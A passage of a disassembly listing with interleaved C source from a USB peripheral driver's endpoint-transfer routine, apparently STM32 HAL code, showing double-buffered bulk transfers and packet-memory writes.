 8006aa6:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006aaa:	6800      	ldr	r0, [r0, #0]
 8006aac:	f001 fcb9 	bl	8008422 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006ab0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ab4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ab8:	681b      	ldr	r3, [r3, #0]
 8006aba:	613b      	str	r3, [r7, #16]
 8006abc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ac0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ac4:	681b      	ldr	r3, [r3, #0]
 8006ac6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006aca:	b29b      	uxth	r3, r3
 8006acc:	461a      	mov	r2, r3
 8006ace:	693b      	ldr	r3, [r7, #16]
 8006ad0:	4413      	add	r3, r2
 8006ad2:	613b      	str	r3, [r7, #16]
 8006ad4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006adc:	681b      	ldr	r3, [r3, #0]
 8006ade:	781b      	ldrb	r3, [r3, #0]
 8006ae0:	00da      	lsls	r2, r3, #3
 8006ae2:	693b      	ldr	r3, [r7, #16]
 8006ae4:	4413      	add	r3, r2
 8006ae6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006aea:	60fb      	str	r3, [r7, #12]
 8006aec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006af0:	b29a      	uxth	r2, r3
 8006af2:	68fb      	ldr	r3, [r7, #12]
 8006af4:	801a      	strh	r2, [r3, #0]
 8006af6:	f000 be1f 	b.w	8007738 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006afa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006afe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b02:	681b      	ldr	r3, [r3, #0]
 8006b04:	78db      	ldrb	r3, [r3, #3]
 8006b06:	2b02      	cmp	r3, #2
 8006b08:	f040 8462 	bne.w	80073d0 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b14:	681b      	ldr	r3, [r3, #0]
 8006b16:	6a1a      	ldr	r2, [r3, #32]
 8006b18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b1c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b20:	681b      	ldr	r3, [r3, #0]
 8006b22:	691b      	ldr	r3, [r3, #16]
 8006b24:	429a      	cmp	r2, r3
 8006b26:	f240 83df 	bls.w	80072e8 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006b2a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b2e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b32:	681a      	ldr	r2, [r3, #0]
 8006b34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b3c:	681b      	ldr	r3, [r3, #0]
 8006b3e:	781b      	ldrb	r3, [r3, #0]
 8006b40:	009b      	lsls	r3, r3, #2
 8006b42:	4413      	add	r3, r2
 8006b44:	881b      	ldrh	r3, [r3, #0]
 8006b46:	b29b      	uxth	r3, r3
 8006b48:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b4c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b50:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006b54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b58:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b5c:	681a      	ldr	r2, [r3, #0]
 8006b5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b66:	681b      	ldr	r3, [r3, #0]
 8006b68:	781b      	ldrb	r3, [r3, #0]
 8006b6a:	009b      	lsls	r3, r3, #2
 8006b6c:	441a      	add	r2, r3
 8006b6e:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006b72:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b76:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b7a:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006b7e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b82:	b29b      	uxth	r3, r3
 8006b84:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006b86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b8a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b8e:	681b      	ldr	r3, [r3, #0]
 8006b90:	6a1a      	ldr	r2, [r3, #32]
 8006b92:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b96:	1ad2      	subs	r2, r2, r3
 8006b98:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b9c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ba0:	681b      	ldr	r3, [r3, #0]
 8006ba2:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006ba4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ba8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bac:	681a      	ldr	r2, [r3, #0]
 8006bae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bb2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bb6:	681b      	ldr	r3, [r3, #0]
 8006bb8:	781b      	ldrb	r3, [r3, #0]
 8006bba:	009b      	lsls	r3, r3, #2
 8006bbc:	4413      	add	r3, r2
 8006bbe:	881b      	ldrh	r3, [r3, #0]
 8006bc0:	b29b      	uxth	r3, r3
 8006bc2:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006bc6:	2b00      	cmp	r3, #0
 8006bc8:	f000 81c7 	beq.w	8006f5a <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006bcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bd0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bd4:	681b      	ldr	r3, [r3, #0]
 8006bd6:	633b      	str	r3, [r7, #48]	; 0x30
 8006bd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bdc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006be0:	681b      	ldr	r3, [r3, #0]
 8006be2:	785b      	ldrb	r3, [r3, #1]
 8006be4:	2b00      	cmp	r3, #0
 8006be6:	d177      	bne.n	8006cd8 <USB_EPStartXfer+0x2ce>
 8006be8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bf0:	681b      	ldr	r3, [r3, #0]
 8006bf2:	62bb      	str	r3, [r7, #40]	; 0x28
 8006bf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bf8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bfc:	681b      	ldr	r3, [r3, #0]
 8006bfe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c02:	b29b      	uxth	r3, r3
 8006c04:	461a      	mov	r2, r3
 8006c06:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c08:	4413      	add	r3, r2
 8006c0a:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c0c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c10:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c14:	681b      	ldr	r3, [r3, #0]
 8006c16:	781b      	ldrb	r3, [r3, #0]
 8006c18:	00da      	lsls	r2, r3, #3
 8006c1a:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c1c:	4413      	add	r3, r2
 8006c1e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c22:	627b      	str	r3, [r7, #36]	; 0x24
 8006c24:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c26:	881b      	ldrh	r3, [r3, #0]
 8006c28:	b29b      	uxth	r3, r3
 8006c2a:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006c2e:	b29a      	uxth	r2, r3
 8006c30:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c32:	801a      	strh	r2, [r3, #0]
 8006c34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c38:	2b3e      	cmp	r3, #62	; 0x3e
 8006c3a:	d921      	bls.n	8006c80 <USB_EPStartXfer+0x276>
 8006c3c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c40:	095b      	lsrs	r3, r3, #5
 8006c42:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c46:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c4a:	f003 031f 	and.w	r3, r3, #31
 8006c4e:	2b00      	cmp	r3, #0
 8006c50:	d104      	bne.n	8006c5c <USB_EPStartXfer+0x252>
 8006c52:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c56:	3b01      	subs	r3, #1
 8006c58:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c5c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c5e:	881b      	ldrh	r3, [r3, #0]
 8006c60:	b29a      	uxth	r2, r3
 8006c62:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c66:	b29b      	uxth	r3, r3
 8006c68:	029b      	lsls	r3, r3, #10
 8006c6a:	b29b      	uxth	r3, r3
 8006c6c:	4313      	orrs	r3, r2
 8006c6e:	b29b      	uxth	r3, r3
 8006c70:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c74:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c78:	b29a      	uxth	r2, r3
 8006c7a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c7c:	801a      	strh	r2, [r3, #0]
 8006c7e:	e050      	b.n	8006d22 <USB_EPStartXfer+0x318>
 8006c80:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c84:	2b00      	cmp	r3, #0
 8006c86:	d10a      	bne.n	8006c9e <USB_EPStartXfer+0x294>
 8006c88:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c8a:	881b      	ldrh	r3, [r3, #0]
 8006c8c:	b29b      	uxth	r3, r3
 8006c8e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c92:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c96:	b29a      	uxth	r2, r3
 8006c98:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c9a:	801a      	strh	r2, [r3, #0]
 8006c9c:	e041      	b.n	8006d22 <USB_EPStartXfer+0x318>
 8006c9e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ca2:	085b      	lsrs	r3, r3, #1
 8006ca4:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006ca8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cac:	f003 0301 	and.w	r3, r3, #1
 8006cb0:	2b00      	cmp	r3, #0
 8006cb2:	d004      	beq.n	8006cbe <USB_EPStartXfer+0x2b4>
 8006cb4:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cb8:	3301      	adds	r3, #1
 8006cba:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cbe:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cc0:	881b      	ldrh	r3, [r3, #0]
 8006cc2:	b29a      	uxth	r2, r3
 8006cc4:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cc8:	b29b      	uxth	r3, r3
 8006cca:	029b      	lsls	r3, r3, #10
 8006ccc:	b29b      	uxth	r3, r3
 8006cce:	4313      	orrs	r3, r2
 8006cd0:	b29a      	uxth	r2, r3
 8006cd2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cd4:	801a      	strh	r2, [r3, #0]
 8006cd6:	e024      	b.n	8006d22 <USB_EPStartXfer+0x318>
 8006cd8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cdc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ce0:	681b      	ldr	r3, [r3, #0]
 8006ce2:	785b      	ldrb	r3, [r3, #1]
 8006ce4:	2b01      	cmp	r3, #1
 8006ce6:	d11c      	bne.n	8006d22 <USB_EPStartXfer+0x318>
 8006ce8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006cf0:	681b      	ldr	r3, [r3, #0]
 8006cf2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006cf6:	b29b      	uxth	r3, r3
 8006cf8:	461a      	mov	r2, r3
 8006cfa:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006cfc:	4413      	add	r3, r2
 8006cfe:	633b      	str	r3, [r7, #48]	; 0x30
 8006d00:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d04:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d08:	681b      	ldr	r3, [r3, #0]
 8006d0a:	781b      	ldrb	r3, [r3, #0]
 8006d0c:	00da      	lsls	r2, r3, #3
 8006d0e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d10:	4413      	add	r3, r2
 8006d12:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d16:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d18:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d1c:	b29a      	uxth	r2, r3
 8006d1e:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006d20:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006d22:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d26:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d2a:	681b      	ldr	r3, [r3, #0]
 8006d2c:	895b      	ldrh	r3, [r3, #10]
 8006d2e:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006d32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d3a:	681b      	ldr	r3, [r3, #0]
 8006d3c:	6959      	ldr	r1, [r3, #20]
 8006d3e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d42:	b29b      	uxth	r3, r3
 8006d44:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006d48:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d4c:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d50:	6800      	ldr	r0, [r0, #0]
 8006d52:	f001 fb66 	bl	8008422 <USB_WritePMA>
            ep->xfer_buff += len;
 8006d56:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d5a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d5e:	681b      	ldr	r3, [r3, #0]
 8006d60:	695a      	ldr	r2, [r3, #20]
 8006d62:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d66:	441a      	add	r2, r3
 8006d68:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d6c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d70:	681b      	ldr	r3, [r3, #0]
 8006d72:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7c:	681b      	ldr	r3, [r3, #0]
 8006d7e:	6a1a      	ldr	r2, [r3, #32]
 8006d80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d88:	681b      	ldr	r3, [r3, #0]
 8006d8a:	691b      	ldr	r3, [r3, #16]
 8006d8c:	429a      	cmp	r2, r3
 8006d8e:	d90f      	bls.n	8006db0 <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d98:	681b      	ldr	r3, [r3, #0]
 8006d9a:	6a1a      	ldr	r2, [r3, #32]
 8006d9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006da0:	1ad2      	subs	r2, r2, r3
 8006da2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006daa:	681b      	ldr	r3, [r3, #0]
 8006dac:	621a      	str	r2, [r3, #32]
 8006dae:	e00e      	b.n	8006dce <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006db0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006db8:	681b      	ldr	r3, [r3, #0]
 8006dba:	6a1b      	ldr	r3, [r3, #32]
 8006dbc:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006dc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dc8:	681b      	ldr	r3, [r3, #0]
 8006dca:	2200      	movs	r2, #0
 8006dcc:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006dce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dd6:	681b      	ldr	r3, [r3, #0]
 8006dd8:	785b      	ldrb	r3, [r3, #1]
 8006dda:	2b00      	cmp	r3, #0
 8006ddc:	d177      	bne.n	8006ece <USB_EPStartXfer+0x4c4>
 8006dde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006de6:	681b      	ldr	r3, [r3, #0]
 8006de8:	61bb      	str	r3, [r7, #24]
 8006dea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dee:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006df2:	681b      	ldr	r3, [r3, #0]
 8006df4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006df8:	b29b      	uxth	r3, r3
 8006dfa:	461a      	mov	r2, r3
 8006dfc:	69bb      	ldr	r3, [r7, #24]
 8006dfe:	4413      	add	r3, r2
 8006e00:	61bb      	str	r3, [r7, #24]
 8006e02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e06:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e0a:	681b      	ldr	r3, [r3, #0]
 8006e0c:	781b      	ldrb	r3, [r3, #0]
 8006e0e:	00da      	lsls	r2, r3, #3
 8006e10:	69bb      	ldr	r3, [r7, #24]
 8006e12:	4413      	add	r3, r2
 8006e14:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e18:	617b      	str	r3, [r7, #20]
 8006e1a:	697b      	ldr	r3, [r7, #20]
 8006e1c:	881b      	ldrh	r3, [r3, #0]
 8006e1e:	b29b      	uxth	r3, r3
 8006e20:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e24:	b29a      	uxth	r2, r3
 8006e26:	697b      	ldr	r3, [r7, #20]
 8006e28:	801a      	strh	r2, [r3, #0]
 8006e2a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e2e:	2b3e      	cmp	r3, #62	; 0x3e
 8006e30:	d921      	bls.n	8006e76 <USB_EPStartXfer+0x46c>
 8006e32:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e36:	095b      	lsrs	r3, r3, #5
 8006e38:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e3c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e40:	f003 031f 	and.w	r3, r3, #31
 8006e44:	2b00      	cmp	r3, #0
 8006e46:	d104      	bne.n	8006e52 <USB_EPStartXfer+0x448>
 8006e48:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e4c:	3b01      	subs	r3, #1
 8006e4e:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e52:	697b      	ldr	r3, [r7, #20]
 8006e54:	881b      	ldrh	r3, [r3, #0]
 8006e56:	b29a      	uxth	r2, r3
 8006e58:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e5c:	b29b      	uxth	r3, r3
 8006e5e:	029b      	lsls	r3, r3, #10
 8006e60:	b29b      	uxth	r3, r3
 8006e62:	4313      	orrs	r3, r2
 8006e64:	b29b      	uxth	r3, r3
 8006e66:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e6a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e6e:	b29a      	uxth	r2, r3
 8006e70:	697b      	ldr	r3, [r7, #20]
 8006e72:	801a      	strh	r2, [r3, #0]
 8006e74:	e056      	b.n	8006f24 <USB_EPStartXfer+0x51a>
 8006e76:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e7a:	2b00      	cmp	r3, #0
 8006e7c:	d10a      	bne.n	8006e94 <USB_EPStartXfer+0x48a>
 8006e7e:	697b      	ldr	r3, [r7, #20]
 8006e80:	881b      	ldrh	r3, [r3, #0]
 8006e82:	b29b      	uxth	r3, r3
 8006e84:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e88:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e8c:	b29a      	uxth	r2, r3
 8006e8e:	697b      	ldr	r3, [r7, #20]
 8006e90:	801a      	strh	r2, [r3, #0]
 8006e92:	e047      	b.n	8006f24 <USB_EPStartXfer+0x51a>
 8006e94:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e98:	085b      	lsrs	r3, r3, #1
 8006e9a:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e9e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ea2:	f003 0301 	and.w	r3, r3, #1
 8006ea6:	2b00      	cmp	r3, #0
 8006ea8:	d004      	beq.n	8006eb4 <USB_EPStartXfer+0x4aa>
 8006eaa:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006eae:	3301      	adds	r3, #1
 8006eb0:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006eb4:	697b      	ldr	r3, [r7, #20]
 8006eb6:	881b      	ldrh	r3, [r3, #0]
 8006eb8:	b29a      	uxth	r2, r3
 8006eba:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006ebe:	b29b      	uxth	r3, r3
 8006ec0:	029b      	lsls	r3, r3, #10
 8006ec2:	b29b      	uxth	r3, r3
 8006ec4:	4313      	orrs	r3, r2
 8006ec6:	b29a      	uxth	r2, r3
 8006ec8:	697b      	ldr	r3, [r7, #20]
 8006eca:	801a      	strh	r2, [r3, #0]
 8006ecc:	e02a      	b.n	8006f24 <USB_EPStartXfer+0x51a>
 8006ece:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ed2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ed6:	681b      	ldr	r3, [r3, #0]
 8006ed8:	785b      	ldrb	r3, [r3, #1]
 8006eda:	2b01      	cmp	r3, #1
 8006edc:	d122      	bne.n	8006f24 <USB_EPStartXfer+0x51a>
 8006ede:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ee2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ee6:	681b      	ldr	r3, [r3, #0]
 8006ee8:	623b      	str	r3, [r7, #32]
 8006eea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006eee:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ef2:	681b      	ldr	r3, [r3, #0]
 8006ef4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006ef8:	b29b      	uxth	r3, r3
 8006efa:	461a      	mov	r2, r3
 8006efc:	6a3b      	ldr	r3, [r7, #32]
 8006efe:	4413      	add	r3, r2
 8006f00:	623b      	str	r3, [r7, #32]
 8006f02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f06:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f0a:	681b      	ldr	r3, [r3, #0]
 8006f0c:	781b      	ldrb	r3, [r3, #0]
 8006f0e:	00da      	lsls	r2, r3, #3
 8006f10:	6a3b      	ldr	r3, [r7, #32]
 8006f12:	4413      	add	r3, r2
 8006f14:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f18:	61fb      	str	r3, [r7, #28]
 8006f1a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f1e:	b29a      	uxth	r2, r3
 8006f20:	69fb      	ldr	r3, [r7, #28]
 8006f22:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006f24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f28:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f2c:	681b      	ldr	r3, [r3, #0]
 8006f2e:	891b      	ldrh	r3, [r3, #8]
 8006f30:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f3c:	681b      	ldr	r3, [r3, #0]
 8006f3e:	6959      	ldr	r1, [r3, #20]
 8006f40:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f44:	b29b      	uxth	r3, r3
 8006f46:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f4a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f4e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f52:	6800      	ldr	r0, [r0, #0]
 8006f54:	f001 fa65 	bl	8008422 <USB_WritePMA>
 8006f58:	e3ee      	b.n	8007738 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006f5a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f5e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f62:	681b      	ldr	r3, [r3, #0]
 8006f64:	785b      	ldrb	r3, [r3, #1]
 8006f66:	2b00      	cmp	r3, #0
 8006f68:	d177      	bne.n	800705a <USB_EPStartXfer+0x650>
 8006f6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f6e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f72:	681b      	ldr	r3, [r3, #0]
 8006f74:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f7a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f7e:	681b      	ldr	r3, [r3, #0]
 8006f80:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f84:	b29b      	uxth	r3, r3
 8006f86:	461a      	mov	r2, r3
 8006f88:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006f8a:	4413      	add	r3, r2
 8006f8c:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f92:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f96:	681b      	ldr	r3, [r3, #0]
 8006f98:	781b      	ldrb	r3, [r3, #0]
 8006f9a:	00da      	lsls	r2, r3, #3
 8006f9c:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006f9e:	4413      	add	r3, r2
 8006fa0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006fa4:	647b      	str	r3, [r7, #68]	; 0x44
 8006fa6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fa8:	881b      	ldrh	r3, [r3, #0]
 8006faa:	b29b      	uxth	r3, r3
 8006fac:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006fb0:	b29a      	uxth	r2, r3
 8006fb2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fb4:	801a      	strh	r2, [r3, #0]
 8006fb6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fba:	2b3e      	cmp	r3, #62	; 0x3e
 8006fbc:	d921      	bls.n	8007002 <USB_EPStartXfer+0x5f8>
